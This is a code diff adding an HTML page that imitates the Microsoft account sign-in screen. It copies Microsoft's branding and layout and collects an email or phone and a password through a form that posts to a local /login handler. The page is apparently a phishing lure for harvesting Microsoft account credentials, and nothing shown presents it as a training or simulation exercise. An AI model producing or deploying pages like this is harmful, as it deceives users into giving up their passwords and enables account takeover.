@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign in to your Microsoft account</title>
+    <style>
+        body { font-family: "Segoe UI", "Helvetica Neue", Arial, sans-serif; background-color: #f2f2f2; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: #fff; padding: 44px; width: 400px; box-shadow: 0 2px 4px rgba(0,0,0,.1); }
+        .logo { width: 108px; margin-bottom: 20px; }
+        h1 { font-size: 24px; font-weight: 600; margin-bottom: 12px; }
+        input[type="text"], input[type="password"] { width: 100%; border: none; border-bottom: 1px solid #666; padding: 8px 0; font-size: 15px; margin-bottom: 20px; outline: none; }
+        input[type="submit"] { background: #0067b8; color: #fff; border: none; padding: 8px 12px; min-width: 108px; float: right; cursor: pointer; }
+        .links { font-size: 13px; color: #0067b8; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg">
+        <h1>Sign in</h1>
+        <form action="/login" method="POST">
+            <input type="text" name="email" placeholder="Email, phone, or Skype" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <div class="links">No account? Create one!</div>
+            <input type="submit" value="Next">
+        </form>
+    </div>
+</body>
+</html>
